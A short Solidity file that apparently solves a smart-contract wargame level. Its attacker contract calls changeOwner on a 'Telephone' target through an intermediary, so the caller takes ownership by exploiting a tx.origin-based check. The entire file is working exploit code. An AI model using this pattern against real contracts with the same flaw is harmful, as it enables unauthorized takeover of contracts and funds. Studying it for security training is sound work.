// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone private telephone;

    constructor(address _telephoneAddress) {
        telephone = ITelephone(_telephoneAddress);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
